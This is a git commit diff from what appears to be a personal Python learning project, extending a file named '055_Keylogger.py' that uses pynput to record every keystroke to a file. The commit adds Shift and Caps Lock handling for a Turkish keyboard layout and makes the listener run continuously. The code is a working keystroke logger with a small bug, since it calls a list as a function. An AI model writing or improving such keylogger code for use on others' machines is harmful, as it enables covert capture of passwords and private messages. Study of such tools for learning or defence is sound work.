c9c3ad221358059a7dad462b6c65763674dc941e
mehmet yel <mehmetyasinyel@hotmail.com>
2021-05-10 05:25:06 +0300

    python_learn28

--- projes/055_Keylogger.py
+++ projes/055_Keylogger.py
@@ -2,26 +2,50 @@ from pynput.keyboard import Listener,Key
 
 liste=list()
 capsdurum=False
+shftdurum=False
+shftliste=["=","!","'","^","+","%","&","/","(",")"]
+rakam="0123456789"
 
 def bas(key):
-    global liste,capsdurum
+    global liste,capsdurum,shftdurum
 
     try:
-        if capsdurum:
+        if shftdurum:
+            if key.char in rakam:
+                liste.append(shftliste(int(key.char)))
+            else:
+                if key.char=="*":
+                    liste.append("?")
+                elif key.char=="-":
+                    liste.append("_")
+                else:
+                    if not capsdurum:
+                        liste.append(key.char.upper())
+                    else:
+                        liste.append(key.char)                
+
+        elif capsdurum:
             liste.append(key.char.upper())
+
         else:
-            liste.append(key.char)                
+            liste.append(key.char)       
+
+                 
         
     except:
         if key==Key.space:
             liste.append(" ")
+
         if key==Key.enter:
             liste.append("\n")
+
         if key==Key.backspace:
             liste.append("'<'")
+
         if key==Key.caps_lock:
             if capsdurum:
                 capsdurum=False
+
             else:
                 capsdurum=True
 
@@ -31,9 +55,15 @@ def bas(key):
         dosya_yaz()
         liste=list()
 
+    if key==Key.shift_l or key==Key.shift_r:
+        shftdurum=True
+
 def birak(key):
 
-    pass
+    global shftdurum
+
+    if key==Key.shift_l or key==Key.shift_r:
+        shftdurum=False
 
 
 def dosya_yaz():
@@ -43,5 +73,7 @@ def dosya_yaz():
         for x in liste:
             dosya.write(x)
             
-with Listener(on_press=bas, on_release=birak) as dinleyici:
+with Listener(on_press=bas, on_release=birak) as dinleyici: 
+    dinleyici.join()
 
+   
